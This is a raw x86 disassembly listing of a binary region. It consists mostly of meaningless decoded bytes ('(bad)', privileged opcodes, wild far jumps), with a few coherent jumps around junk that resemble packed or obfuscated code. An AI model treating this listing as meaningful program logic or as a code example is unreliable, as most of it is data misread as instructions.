  40bab8:	mov    edx,DWORD PTR [ebp+0xc]
  40babb:	jmp    0x40be2e
  40bac0:	cmp    BYTE PTR ds:0x766dac5b,ch
  40bac6:	retf   
  40bac7:	jge    0x40bac8
  40bac9:	dec    ebx
  40baca:	jo     0x40baa5
  40bacc:	add    DWORD PTR [eax+0xc],ecx
  40bacf:	xchg   BYTE PTR [ebp-0x3583837d],dl
  40bad5:	jns    0x40bb53
  40bad7:	jl     0x40baa7
  40bad9:	push   ss
  40bada:	test   al,0xe6
  40badc:	sbb    DWORD PTR [ebp+0x555580a1],ecx
  40bae2:	cmp    eax,DWORD PTR [eax]
  40bae4:	cwde   
  40bae5:	jge    0x40ba67
  40bae7:	and    edi,DWORD PTR [eax+0x6fc62941]
  40baed:	ret    0x67dd
  40baf0:	cmp    esi,DWORD PTR [edx]
  40baf2:	sbb    BYTE PTR [ebp+0x3b],0xb8
  40baf6:	mov    ds:0xa7c23aa8,eax
  40bafb:	sbb    DWORD PTR [ecx+0x12d077e3],eax
  40bb01:	mov    cl,0x53
  40bb03:	imul   ebx,esp,0x4b
  40bb06:	pop    bx
  40bb08:	daa    
  40bb09:	aas    
  40bb0a:	or     eax,0xf1221ae0
  40bb0f:	dec    esi
  40bb10:	icebp  
  40bb11:	mov    dl,0x60
  40bb13:	outs   dx,BYTE PTR ds:[esi]
  40bb14:	mov    ecx,0xda5374b0
  40bb19:	or     eax,0xccc0836c
  40bb1e:	mov    eax,ds:0xf4fc4a4a
  40bb23:	adc    eax,DWORD PTR [ecx]
  40bb25:	ror    DWORD PTR ds:[eax-0x59bc289d],cl
  40bb2c:	add    BYTE PTR [eax+0x7053ffb],0x78
  40bb33:	dec    ebp
  40bb34:	jmp    0x40bb96
  40bb36:	aaa    
  40bb37:	pop    ecx
  40bb38:	sahf   
  40bb39:	and    al,0x95
  40bb3b:	aas    
  40bb3c:	pop    ebp
  40bb3d:	inc    edi
  40bb3e:	in     al,dx
  40bb3f:	mov    ebp,eax
  40bb41:	call   0x341a8a83
  40bb46:	test   DWORD PTR [esi-0x173643bf],0xc36f0cc9
  40bb50:	lds    edx,FWORD PTR [ebx+ebx*4+0x16]
  40bb54:	test   BYTE PTR [edi-0x5e],dh
  40bb57:	les    ebp,FWORD PTR [edi+eax*8-0x68c1bed5]
  40bb5e:	dec    ebp
  40bb5f:	or     DWORD PTR [esi+0x6e00f88c],ebx
  40bb65:	mov    edx,0xb0f5223c
  40bb6a:	hlt    
  40bb6b:	push   esp
  40bb6c:	out    dx,al
  40bb6d:	push   edi
  40bb6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb6f:	loopne 0x40bb63
  40bb71:	inc    esp
  40bb72:	xchg   edi,eax
  40bb73:	inc    eax
  40bb74:	hlt    
  40bb75:	and    eax,0xa6c910c9
  40bb7a:	test   DWORD PTR ds:0x99551826,esi
  40bb80:	push   ecx
  40bb81:	sbb    eax,0x10961fd1
  40bb86:	sub    bh,BYTE PTR [esp+edi*1]
  40bb89:	push   esp
  40bb8a:	retf   0x43a1
  40bb8d:	fdiv   st,st(5)
  40bb8f:	test   DWORD PTR [ecx+edx*2+0x6b7144da],esp
  40bb96:	fistp  QWORD PTR [edx]
  40bb98:	mov    ds:0x44c78e90,al
  40bb9d:	cs pop ss
  40bb9f:	dec    edi
  40bba0:	jo     0x40bbd0
  40bba2:	lds    ebp,FWORD PTR [edx]
  40bba4:	or     BYTE PTR [ebx],al
  40bba6:	dec    DWORD PTR [ebx]
  40bba8:	xchg   esi,eax
  40bba9:	jmp    0x15ab:0x5f68a5b6
  40bbb0:	mov    eax,ds:0xb10fae2e
  40bbb5:	retf   
  40bbb6:	in     eax,dx
  40bbb7:	sbb    DWORD PTR [eax+ebp*4-0xa122f72],ebx
  40bbbe:	lea    esi,[ecx+eax*4]
  40bbc1:	pop    ebx
  40bbc2:	stos   BYTE PTR es:[edi],al
  40bbc3:	pop    esp
  40bbc4:	push   edi
  40bbc5:	pop    ds
  40bbc6:	inc    eax
  40bbc7:	int3   
  40bbc8:	das    
  40bbc9:	inc    edx
  40bbca:	bound  esp,QWORD PTR [ecx+edx*2+0x33ee17f8]
  40bbd1:	fwait
  40bbd2:	push   esi
  40bbd3:	cmp    BYTE PTR [edi],0x61
  40bbd6:	sbb    al,0x4c
  40bbd8:	(bad)  
  40bbda:	mov    DWORD PTR [edi-0x11],esp
  40bbdd:	push   esp
  40bbde:	mov    bl,0xea
  40bbe0:	xchg   dh,al
  40bbe2:	add    eax,0xc956e494
  40bbe7:	xchg   ebx,eax
  40bbe8:	ins    DWORD PTR es:[edi],dx
  40bbe9:	mov    esi,0xf510e4c1
  40bbee:	adc    ebx,DWORD PTR [edx]
  40bbf0:	jle    0x40bc10
  40bbf2:	jnp    0x40bbba
  40bbf4:	mov    al,0x6c
  40bbf6:	nop
  40bbf7:	(bad)  
  40bbf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbfa:	mov    ?,WORD PTR [esi+0x4a]
  40bbfd:	xchg   ebx,eax
  40bbfe:	mov    edx,DWORD PTR [ebx+esi*1-0x12c77af3]
  40bc05:	das    
  40bc06:	int    0x26
  40bc08:	jns    0x40bc00
  40bc0a:	(bad)
  40bc0e:	sub    eax,0x44c05e17
  40bc13:	arpl   WORD PTR ds:0x5dcee5f7,sp
  40bc19:	adc    bl,ch
  40bc1b:	xchg   ebp,ebx
  40bc1d:	daa    
  40bc1e:	or     DWORD PTR ds:0xd282ae1c,edi
  40bc24:	push   eax
  40bc25:	adc    al,0x89
  40bc27:	inc    ecx
  40bc28:	js     0x40bc55
  40bc2a:	or     eax,0xb620b8e9
  40bc2f:	xchg   esp,eax
  40bc30:	fcmovne st,st(1)
  40bc32:	mov    ds:0x33dcbf77,eax
  40bc37:	mov    cl,0x58
  40bc39:	jbe    0x40bc1a
  40bc3b:	outs   dx,BYTE PTR fs:[esi]
  40bc3d:	es jge 0x40bc92
  40bc40:	fisub  WORD PTR [eax]
  40bc42:	dec    esp
  40bc43:	lea    ebx,[esi]
  40bc45:	retf   0x84e7
  40bc48:	inc    ecx
  40bc49:	xor    eax,0x6a09af67
  40bc4e:	mov    gs,WORD PTR [esi+ecx*2-0x21d0cae4]
  40bc55:	inc    ecx
  40bc56:	jecxz  0x40bcc3
  40bc58:	dec    ecx
  40bc59:	aas    
  40bc5a:	aaa    
  40bc5b:	xor    BYTE PTR [ecx],dl
  40bc5d:	add    edx,DWORD PTR [edx+esi*1]
  40bc60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc61:	pop    edx
  40bc62:	bound  esp,QWORD PTR [eax]
  40bc64:	fisubr DWORD PTR [ebx+0x15]
  40bc67:	shr    ecx,cl
  40bc69:	sub    bl,dh
  40bc6b:	mov    cl,BYTE PTR ds:0x1c5f0f89
  40bc71:	arpl   WORD PTR [eax-0x7c],sp
  40bc74:	enter  0x3d4a,0x2b
  40bc78:	jle    0x40bcdf
  40bc7a:	sbb    BYTE PTR [ebx-0x30e71bb6],bh
  40bc80:	ss lahf 
  40bc82:	cmp    eax,0xb717a68c
  40bc87:	fs das 
  40bc89:	sbb    WORD PTR [esi-0x4f],ax
  40bc8d:	aad    0x3d
  40bc8f:	(bad)  
  40bc90:	sti    
  40bc91:	fmul   st(5),st
  40bc93:	adc    BYTE PTR [edx-0x19f58f27],dh
  40bc99:	ficom  DWORD PTR ds:0x50bfea70
  40bc9f:	jb     0xaf8f7bf4
  40bca5:	jl     0x40bc2e
  40bca7:	dec    ebp
  40bca8:	popf   
  40bca9:	and    BYTE PTR ds:0x1baeff70,0xc0
  40bcb0:	mov    ecx,0xe3d9a80e
  40bcb5:	sahf   
  40bcb6:	xor    al,0xfa
  40bcb8:	sti    
  40bcb9:	mov    ah,0x2a
  40bcbb:	jmp    0x1724325d
  40bcc0:	imul   ebx,DWORD PTR [ecx+0x38],0x69573bad
  40bcc7:	sub    BYTE PTR [ecx+0x1c],dh
  40bcca:	sub    ch,BYTE PTR [ebx+0x7d22c5cd]
  40bcd0:	inc    esi
  40bcd1:	inc    eax
  40bcd2:	aam    0x85
  40bcd4:	mov    cl,0xd1
  40bcd6:	call   0x2381:0x6ba31327
  40bcdd:	inc    esp
  40bcde:	inc    eax
  40bcdf:	inc    ebx
  40bce0:	xor    esi,eax
  40bce2:	mov    ds:0xfcff4e16,al
  40bce7:	add    eax,0x79927574
  40bcec:	pop    es
  40bced:	test   al,0xa5
  40bcef:	sbb    ch,BYTE PTR [ebx+0x6f]
  40bcf2:	(bad)  
  40bcf3:	ins    BYTE PTR es:[edi],dx
  40bcf4:	ficom  DWORD PTR [edx+0x30]
  40bcf7:	int3   
  40bcf8:	(bad)  
  40bcf9:	mov    ch,BYTE PTR [ecx-0x1f]
  40bcfc:	sbb    al,0xf9
  40bcfe:	jo     0x40bcec
  40bd00:	ret    
  40bd01:	call   0x953bb34f
  40bd06:	idiv   DWORD PTR [ecx+ebp*8-0x22]
  40bd0a:	jnp    0x40bce6
  40bd0c:	dec    esi
  40bd0d:	cmp    ebx,edx
  40bd0f:	call   0x9eb9:0xf3edc891
  40bd16:	jnp    0x40bd4f
  40bd18:	mov    DWORD PTR [esi-0x6e12eeb5],esp
  40bd1e:	cmp    esi,DWORD PTR [edi-0x79]
  40bd21:	ja     0x40bd43
  40bd23:	and    al,0x99
  40bd25:	fnstenv fs:[ecx]
  40bd28:	imul   edi,DWORD PTR [eax],0x72
  40bd2b:	push   ss
  40bd2c:	or     eax,0x8d41a3de
  40bd31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd32:	js     0x40bccf
  40bd34:	sbb    ch,bl
  40bd36:	mov    al,0x9c
  40bd38:	and    ebx,DWORD PTR [esi]
  40bd3a:	ins    BYTE PTR es:[edi],dx
  40bd3b:	cmp    BYTE PTR [ebp-0x39c480fc],ah
  40bd41:	arpl   si,sp
  40bd43:	jle    0x40bd8d
  40bd45:	call   0x9ed399c
  40bd4a:	inc    esp
  40bd4b:	scas   eax,DWORD PTR es:[edi]
  40bd4c:	hlt    
  40bd4d:	ins    DWORD PTR es:[edi],dx
  40bd4e:	push   ss
  40bd4f:	push   esp
  40bd50:	test   eax,0xcc0584c9
  40bd55:	outs   dx,BYTE PTR ds:[esi]
  40bd56:	xchg   ebx,eax
  40bd57:	out    0x32,al
  40bd59:	add    edi,DWORD PTR [edx-0x51]
  40bd5c:	out    dx,eax
  40bd5d:	sbb    edi,DWORD PTR ds:0xa8ec746
  40bd63:	inc    edx
  40bd64:	and    DWORD PTR [ebp+0x471da5ec],ebp
  40bd6a:	jno    0x40bd5f
  40bd6c:	push   eax
  40bd6d:	gs sub cl,ch
  40bd70:	push   edx
  40bd71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd72:	jno    0x40bdc5
  40bd74:	std    
  40bd75:	dec    BYTE PTR [ebx]
  40bd77:	or     eax,0x64dd45fe
  40bd7c:	adc    eax,edi
  40bd7e:	daa    
  40bd7f:	mov    dl,0x98
  40bd81:	ds cdq 
  40bd83:	mov    al,ds:0x700727e8
  40bd88:	jbe    0x40bd6a
  40bd8a:	and    BYTE PTR [ebx],cl
  40bd8c:	dec    eax
  40bd8d:	jmp    0x40bd44
  40bd8f:	push   ebx
  40bd90:	rol    cl,0x4e
  40bd93:	push   ds
  40bd94:	mov    BYTE PTR [esi+0x688d8d3a],ch
  40bd9a:	fs adc eax,edi
  40bd9d:	in     al,0x6e
  40bd9f:	mov    eax,ds:0xfe923704
  40bda4:	je     0x40bd42
  40bda6:	test   eax,0xfa4842a8
  40bdab:	and    BYTE PTR [ebp-0x43],bl
  40bdae:	jns    0x40bd83
  40bdb0:	loope  0x40bdda
  40bdb2:	mov    edi,0xf7e8d913
  40bdb7:	sub    al,0x11
  40bdb9:	(bad)  
  40bdba:	icebp  
  40bdbb:	dec    ecx
  40bdbc:	pop    edx
  40bdbd:	or     cl,BYTE PTR [esi]
  40bdbf:	(bad)  
  40bdc0:	push   esp
  40bdc1:	lahf   
  40bdc2:	adc    cl,BYTE PTR [eax-0x2e5c1beb]
  40bdc8:	or     eax,0x61902561
  40bdcd:	cdq    
  40bdce:	loopne 0x40be1f
  40bdd0:	jbe    0x40bd61
  40bdd2:	gs sti 
  40bdd4:	mov    esi,0x4e5981e8
  40bdd9:	add    ecx,DWORD PTR [ecx-0x7a67f292]
  40bddf:	xor    esi,DWORD PTR ds:0xba53f168
  40bde5:	les    ebx,FWORD PTR [ecx]
  40bde7:	inc    edi
  40bde8:	push   ebp
  40bde9:	mov    ah,0x3b
  40bdeb:	inc    eax
  40bdec:	dec    ecx
  40bded:	push   0x6d3fb032
  40bdf2:	pop    ebx
  40bdf3:	add    esp,ecx
  40bdf5:	mov    ds:0x98dc778c,al
  40bdfa:	push   ebp
  40bdfb:	dec    ecx
  40bdfc:	jo     0x40bdee
  40bdfe:	fisub  DWORD PTR [eax+0x8]
  40be01:	enter  0xad17,0x35
  40be05:	sbb    DWORD PTR [ecx],0xffffff9a
  40be08:	mov    esp,0xb04ee883
  40be0d:	sub    BYTE PTR [ebx-0x64],0x19
  40be11:	je     0x40bdf3
  40be13:	and    DWORD PTR [edx],esp
  40be15:	jmp    0x40bdb4
  40be17:	cmp    eax,0x62d0d407
  40be1c:	addr16 popf 
  40be1e:	fs dec ebx
  40be20:	dec    edi
  40be21:	dec    edx
  40be22:	cmp    BYTE PTR [ebp+0x5102d803],ch
  40be28:	pop    ecx
  40be29:	xchg   esp,eax
  40be2a:	mov    esp,0x899214dc
  40be2f:	push   ebp
  40be30:	fmul   QWORD PTR [ebx+0x5503f855]
  40be36:	rol    bh,0x45
  40be39:	call   0xf8dd4373
  40be3e:	mov    DWORD PTR [ebp-0x1c],edx
  40be41:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  40be48:	mov    DWORD PTR [ebp-0x44],0xf89c853b
  40be4f:	mov    edx,DWORD PTR [ebp-0x18]
  40be52:	xor    edx,eax
  40be54:	jmp    0x40c1c7
  40be59:	adc    eax,edx
  40be5b:	mov    bl,0x4c
  40be5d:	jge    0x40bec8
  40be5f:	repz dec ebp
  40be61:	push   ebp
  40be62:	add    ecx,DWORD PTR [ebx+ebx*4]
  40be65:	xlat   BYTE PTR ds:[ebx]
  40be66:	xchg   BYTE PTR [ecx],al
  40be68:	in     eax,dx
  40be69:	arpl   WORD PTR [esp+edi*2+0x7c79ca7c],cx
  40be70:	jl     0x40be66
  40be72:	(bad)  
  40be73:	repz stc 
  40be75:	mov    ch,0x4d
  40be77:	jl     0x40beb3
  40be79:	inc    edx
  40be7a:	int3   
  40be7b:	cmp    al,0x73
  40be7d:	(bad)  
  40be7e:	sbb    bh,BYTE PTR [ebx+0x8742493]
  40be84:	push   eax
  40be85:	and    DWORD PTR [ebx+0x2a],edx
  40be88:	add    DWORD PTR [eax-0x4a8d8bcd],edx
  40be8e:	repz push es
  40be90:	mov    DWORD PTR [eax-0x19],ecx
  40be93:	fldenv [ecx-0x75]
  40be96:	shr    DWORD PTR [ebx*1-0x6123974f],0x5f
  40be9e:	push   0x5388ac2f
  40bea3:	aad    0x28
  40bea5:	arpl   WORD PTR [edx],bp
  40bea7:	or     al,0x36
  40bea9:	sbb    bh,dh
  40beab:	mov    ebp,0xcaaa7f7a
  40beb0:	cmp    al,0x65
  40beb2:	ror    bh,1
  40beb4:	mov    al,ds:0xfd886dd9
  40beb9:	push   edi
  40beba:	inc    edx
  40bebb:	das    
  40bebc:	enter  0xf696,0x8b
  40bec0:	stc    
  40bec1:	into   
  40bec2:	push   ebp
  40bec3:	or     BYTE PTR [eax+0x6c],dh
  40bec6:	imul   ebx,DWORD PTR [ebp+0x71622f99],0xb
  40becd:	pushw  0x2489
  40bed1:	xchg   esi,eax
  40bed2:	sbb    ah,BYTE PTR [ebx]
  40bed4:	das    
  40bed5:	bound  esi,QWORD PTR [edx]
  40bed7:	xlat   BYTE PTR ds:[ebx]
  40bed8:	call   0xfd6e0c87
  40bedd:	or     BYTE PTR [edx+0x7f84cdaf],0xda
  40bee4:	mov    bh,0x16
  40bee6:	stc    
  40bee7:	imul   ecx,DWORD PTR [ebp+0x50083333],0x64
  40beee:	add    eax,0x722eba54
  40bef3:	(bad)  
  40bef4:	sar    esp,0x37
  40bef7:	(bad)  
  40bef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bef9:	ins    DWORD PTR es:[edi],dx
  40befa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40befb:	cmp    esp,DWORD PTR ds:0x2ffe5212
  40bf01:	mov    dl,0x59
  40bf03:	(bad)  
  40bf04:	fbstp  TBYTE PTR [ebx-0x54f77cd1]
  40bf0a:	mov    edi,0xadffe1fc
  40bf0f:	cmp    DWORD PTR [eax],edx
  40bf11:	add    eax,0x86f4706c
  40bf16:	jbe    0x40beec
  40bf18:	(bad)  
  40bf19:	in     al,0xfa
  40bf1b:	mov    al,ds:0xba0d122b
  40bf20:	pop    ecx
  40bf21:	add    DWORD PTR [ecx+0x63],edi
  40bf24:	inc    ecx
  40bf25:	mov    BYTE PTR [eax],dh
  40bf27:	ror    bh,0xca
  40bf2a:	pusha  
  40bf2b:	xchg   edx,eax
  40bf2c:	rcl    DWORD PTR [edi-0x27],cl
  40bf2f:	push   cs
  40bf30:	shr    DWORD PTR [eax+edi*4],cl
  40bf33:	stos   DWORD PTR es:[edi],eax
  40bf34:	push   ss
  40bf35:	je     0x40bee2
  40bf37:	add    esi,esp
  40bf39:	push   eax
  40bf3a:	hlt    
  40bf3b:	in     eax,dx
  40bf3c:	inc    esp
  40bf3d:	push   esp
  40bf3e:	mov    cl,0xfb
  40bf40:	out    dx,eax
  40bf41:	jmp    0x176f:0x16869598
  40bf48:	dec    esi
  40bf49:	arpl   cx,bx
  40bf4b:	and    eax,0xe969d6e7
  40bf50:	sub    edi,esi
  40bf52:	mov    ds:0xf7e9969d,al
  40bf57:	shl    BYTE PTR [edi+0x454e6f83],cl
  40bf5d:	(bad)  
  40bf5e:	xchg   edi,eax
  40bf5f:	and    eax,0x7a90a17c
  40bf64:	cmp    edi,eax
  40bf66:	scas   al,BYTE PTR es:[edi]
  40bf67:	jo     0x40bf28
  40bf69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf6a:	(bad)  
  40bf6b:	push   edx
  40bf6c:	adc    bl,BYTE PTR [ebx-0x6eb3bbdc]
  40bf72:	int    0xec
  40bf74:	outs   dx,DWORD PTR ds:[esi]
  40bf75:	iret   
  40bf76:	pop    ecx
  40bf77:	mov    DWORD PTR [eax-0x3],0xca99687
  40bf7e:	imul   ebx,DWORD PTR [ecx],0xffffffb0
  40bf81:	sub    al,0x8f
  40bf83:	sbb    DWORD PTR [ecx-0x31],esi
  40bf86:	mov    ds,WORD PTR [edx+0x7d0768c3]
  40bf8c:	push   edi
  40bf8d:	lods   al,BYTE PTR ds:[esi]
  40bf8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf8f:	mov    ebx,0x520cd3ad
  40bf94:	in     al,0xa5
  40bf96:	mov    eax,ds:0xdc1e3e78
  40bf9b:	div    DWORD PTR [ecx-0x31]
  40bf9e:	arpl   si,ax
  40bfa0:	inc    ebp
  40bfa1:	mov    esp,0x81d83362
  40bfa6:	mov    DWORD PTR [ebx+0x28],esp
  40bfa9:	xchg   edi,eax
  40bfaa:	adc    ecx,DWORD PTR [edx-0x2731c7ab]
  40bfb0:	push   ecx
  40bfb1:	sbb    al,0x14
  40bfb3:	out    dx,eax
  40bfb4:	mov    ?,ecx
  40bfb6:	jge    0x40bfe2
  40bfb8:	js     0x40bfba
  40bfba:	mov    dh,0x23
  40bfbc:	rol    BYTE PTR [eax-0x7a],1
  40bfbf:	cmp    cl,BYTE PTR [edx-0x23]
  40bfc2:	lock jg 0x40bf58
  40bfc5:	call   FWORD PTR [ebx-0x35b5b403]
  40bfcb:	sbb    eax,0x21232124
  40bfd0:	retf   
  40bfd1:	stc    
  40bfd2:	cmp    ah,BYTE PTR [ebx-0x91f0599]
  40bfd8:	jae    0x40bf6e
  40bfda:	and    DWORD PTR [ecx],edx
  40bfdc:	ret    
  40bfdd:	hlt    
  40bfde:	pop    esp
  40bfdf:	ja     0x40c038
  40bfe1:	enter  0xe3a2,0xaf
  40bfe5:	scas   al,BYTE PTR es:[edi]
  40bfe6:	or     DWORD PTR [esi+ebp*2],edi
  40bfe9:	sub    eax,0xf0110d53
  40bfee:	mov    dl,0x79
  40bff0:	push   0x5e
  40bff2:	jbe    0x40c066
  40bff4:	fsub   DWORD PTR [ecx-0x59d2d41f]
  40bffa:	das    
  40bffb:	ins    BYTE PTR es:[edi],dx
  40bffc:	dec    edx
  40bffd:	bound  esp,QWORD PTR [eax-0x2b8cf9ca]
  40c003:	xor    edx,edx
  40c005:	and    dl,BYTE PTR [ebp+0x43]
  40c008:	add    eax,0xd37fbc15
  40c00d:	mov    bh,BYTE PTR [ebx-0x1c99cf58]
  40c013:	ficomp DWORD PTR [edi+ebx*2-0x5b]
  40c017:	test   al,0x47
  40c019:	mov    BYTE PTR [esi-0xb],dh
  40c01c:	dec    edx
  40c01d:	push   sp
  40c01f:	or     ebp,DWORD PTR [esi-0x392f567b]
  40c025:	clts   
  40c027:	cmp    ecx,DWORD PTR [edi+0x5d]
  40c02a:	add    DWORD PTR [esi-0x43],edx
  40c02d:	push   eax
  40c02e:	dec    edi
  40c02f:	mov    ebx,0xf78830f1
  40c034:	out    0xf,eax
  40c036:	stc    
  40c037:	adc    cl,ch
  40c039:	cwde   
  40c03a:	sar    BYTE PTR [edi+eax*1],0xcd
  40c03e:	or     ah,BYTE PTR [esi+0x78]
  40c041:	sub    DWORD PTR [esi],ebp
  40c043:	call   0x25ae:0xe34e1b1b
  40c04a:	mov    eax,ds:0xdc253802
  40c04f:	sbb    edi,DWORD PTR [edx]
  40c051:	mov    fs,WORD PTR ds:0x77fca24f
  40c057:	add    BYTE PTR [edi+0x44],0xe4
  40c05b:	add    BYTE PTR [edx-0x62],dl
  40c05e:	in     eax,0x5b
  40c060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c061:	lea    ebx,ds:[ebx+0x5c414ade]
  40c068:	mov    esi,0x54d44173
  40c06d:	test   BYTE PTR [ebx-0x4dd566fa],dl
  40c073:	ds cmc 
  40c075:	loope  0x40c00d
  40c077:	cmp    bh,dl
  40c079:	mov    esp,0xc04acd8e
  40c07e:	mov    al,0x65
  40c080:	and    BYTE PTR [edx+0x3f],dl
  40c083:	out    dx,al
  40c084:	pop    eax
  40c085:	jne    0x40c0e0
  40c087:	in     eax,dx
  40c088:	stos   DWORD PTR es:[edi],eax
  40c089:	les    ecx,FWORD PTR [eax]
  40c08b:	and    BYTE PTR [esi+0x37],0xb5
  40c08f:	stos   DWORD PTR es:[edi],eax
  40c090:	je     0x40c0e4
  40c092:	aaa    
  40c093:	push   es
  40c094:	ror    BYTE PTR [esi],cl
  40c096:	adc    BYTE PTR [ecx+0x4fbe3f21],dl
  40c09c:	mov    bh,BYTE PTR [esp+edx*2]
  40c09f:	mov    ch,0x13
  40c0a1:	sbb    ebx,ebp
  40c0a3:	mov    bh,0xa3
  40c0a5:	cmp    edi,DWORD PTR [esi-0x5753d6ea]
  40c0ab:	mov    edx,0xc70fe0f4
  40c0b0:	cmp    al,0xdb
  40c0b2:	pop    edx
  40c0b3:	mov    esp,0x2526d94a
  40c0b8:	lods   eax,DWORD PTR ds:[esi]
  40c0b9:	pop    esp
  40c0ba:	cmp    al,0x3d
  40c0bc:	mov    ?,edx
  40c0be:	rcl    edx,cl
  40c0c0:	dec    eax
  40c0c1:	scas   eax,DWORD PTR es:[edi]
  40c0c2:	add    al,0x98
  40c0c4:	inc    ebp
  40c0c5:	sub    DWORD PTR [edi+0x21],edx
  40c0c8:	or     eax,0xdb1cd309
  40c0cd:	xor    al,0xb7
  40c0cf:	pop    ebp
  40c0d0:	jp     0x40c13c
  40c0d2:	cdq    
  40c0d3:	aas    
  40c0d4:	aaa    
  40c0d5:	out    0xb6,al
  40c0d7:	mov    cs,esp
  40c0d9:	nop
  40c0da:	sub    ebx,DWORD PTR [eax-0x3b4812b9]
  40c0e0:	add    al,0xb5
  40c0e2:	retf   
  40c0e3:	and    DWORD PTR [ebx],ebx
  40c0e5:	adc    esp,esp
  40c0e7:	cwde   
  40c0e8:	aad    0xb7
  40c0ea:	mov    edi,0x2d8e6093
  40c0ef:	xchg   edx,eax
  40c0f0:	sahf   
  40c0f1:	dec    edi
  40c0f2:	push   esp
  40c0f3:	jae    0x40c15d
  40c0f5:	push   0xffffff97
  40c0f7:	jne    0x40c07c
  40c0f9:	popa   
  40c0fa:	jmp    0x40c126
  40c0fc:	push   ss
  40c0fd:	repnz xor BYTE PTR [edx-0x6a],cl
  40c101:	and    eax,DWORD PTR [ebx]
  40c103:	cdq    
  40c104:	(bad)  
  40c105:	adc    ax,WORD PTR [edx-0x48ee1768]
  40c10c:	loopne 0x40c125
  40c10e:	and    edi,DWORD PTR [ebp-0x3593b97e]
  40c114:	cwde   
  40c115:	ins    DWORD PTR es:[edi],dx
  40c116:	add    DWORD PTR [ebp-0x4d1b23e7],ebx
  40c11c:	std    
  40c11d:	pop    ecx
  40c11e:	sbb    ebx,DWORD PTR ds:0x3944ba69
  40c125:	ins    DWORD PTR es:[edi],dx
  40c126:	pop    ss
  40c127:	test   DWORD PTR [ecx-0x75],ebp
  40c12a:	xchg   esi,eax
  40c12b:	imul   ebx,DWORD PTR [edx],0x4b5cd5b
  40c131:	xor    bh,BYTE PTR [ebp-0xcc66b23]
  40c137:	fs pop esp
  40c139:	cmp    al,bl
  40c13b:	mov    esi,0xaa04344d
  40c140:	fnstcw WORD PTR [eax-0x5ccb9cbd]
  40c146:	call   0x3a177e06
  40c14b:	or     al,0x84
  40c14d:	xchg   ebx,eax
  40c14e:	cmp    esi,esp
  40c150:	in     al,dx
  40c151:	pusha  
  40c152:	pop    es
  40c153:	aaa    
  40c154:	mov    edi,0xa0b3ecf3
  40c159:	mov    al,0x77
  40c15b:	fld    TBYTE PTR [ebp+0x36]
  40c15e:	mov    WORD PTR [edi+0x5b],?
  40c161:	cmc    
  40c162:	retf   
  40c163:	hlt    
  40c164:	(bad)  
  40c165:	sbb    eax,0x34454ddb
  40c16a:	push   eax
  40c16b:	mov    edx,0xb613b3fc
  40c170:	not    DWORD PTR [eax]
  40c172:	cld    
  40c173:	(bad)  
  40c174:	(bad)  
  40c176:	or     ah,bh
  40c178:	push   ss
  40c179:	xchg   ecx,eax
  40c17a:	mov    eax,0x15fe574d
  40c17f:	xchg   ebp,eax
  40c180:	outs   dx,DWORD PTR ds:[esi]
  40c181:	pusha  
  40c182:	jp     0x40c18f
  40c184:	mov    ds:0x653ab8ad,al
  40c189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c18a:	push   ecx
  40c18b:	jnp    0x40c155
  40c18d:	jns    0x40c20e
  40c18f:	jnp    0x40c125
  40c191:	push   ebx
  40c192:	retf   0x1d83
  40c195:	jno    0x40c20e
  40c197:	and    DWORD PTR [esi-0xd4e0149],esp
  40c19d:	in     al,0x94
  40c19f:	outs   dx,BYTE PTR ds:[esi]
  40c1a0:	sbb    DWORD PTR ds:0x9340885c,eax
  40c1a6:	inc    edi
  40c1a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1a8:	adc    BYTE PTR [ecx],bl
  40c1aa:	lods   eax,DWORD PTR ds:[esi]
  40c1ab:	xor    eax,0xb29424b7
  40c1b0:	aam    0xcf
  40c1b2:	inc    eax
  40c1b3:	test   DWORD PTR [esi+eiz*8+0x17],ebx
  40c1b7:	push   ecx
  40c1b8:	sbb    dh,BYTE PTR [ecx]
  40c1ba:	lea    ebp,[edi-0x787d6490]
  40c1c0:	call   0x4f3fd52a
  40c1c5:	mov    esp,0xe9d103bd
  40c1ca:	ror    DWORD PTR [edx],0x0
  40c1cd:	add    cl,ch
  40c1cf:	outs   dx,BYTE PTR ds:[esi]
  40c1d0:	add    eax,DWORD PTR [eax]
  40c1d2:	add    BYTE PTR [esi],dl
  40c1d4:	daa    
  40c1d5:	inc    ecx
  40c1d6:	imul   esi,DWORD PTR [ecx+0x69],0xb3b66736
  40c1dd:	xchg   ecx,eax
  40c1de:	popf   
  40c1df:	cmp    al,0x85
  40c1e1:	test   BYTE PTR [edi],dl
  40c1e3:	cmp    DWORD PTR [eax+0x79ca7c7c],ecx
  40c1e9:	jl     0x40c267
  40c1eb:	retf   
  40c1ec:	fdivr  DWORD PTR [esi+0x5]
  40c1ef:	pop    esi
  40c1f0:	inc    ecx
  40c1f1:	adc    DWORD PTR [eax-0x79],esi
  40c1f4:	les    ebx,FWORD PTR [edx+0x8ccaa8f]
  40c1fa:	xor    al,0x88
  40c1fc:	in     al,0xca
  40c1fe:	or     al,0x43
  40c200:	cli    
  40c201:	rol    DWORD PTR [ecx+edi*2-0x4b2afbfb],cl
  40c208:	scas   al,BYTE PTR es:[edi]
  40c209:	cmp    eax,0x94a91595
  40c20e:	cmp    BYTE PTR gs:[ebp-0x37],0xf
  40c213:	loop   0x40c269
  40c215:	add    eax,esp
  40c217:	or     cl,al
  40c219:	push   0xf9faf7be
  40c21e:	add    esp,ecx
  40c220:	dec    ecx
  40c221:	bound  esi,QWORD PTR [ebx]
  40c223:	call   0xfc65:0x2002383d
  40c22a:	or     al,0x46
  40c22c:	cmp    DWORD PTR [ecx],ebp
  40c22e:	push   esi
  40c22f:	stos   DWORD PTR es:[edi],eax
  40c230:	(bad)  [ebx]
  40c232:	sub    eax,0x2663140f
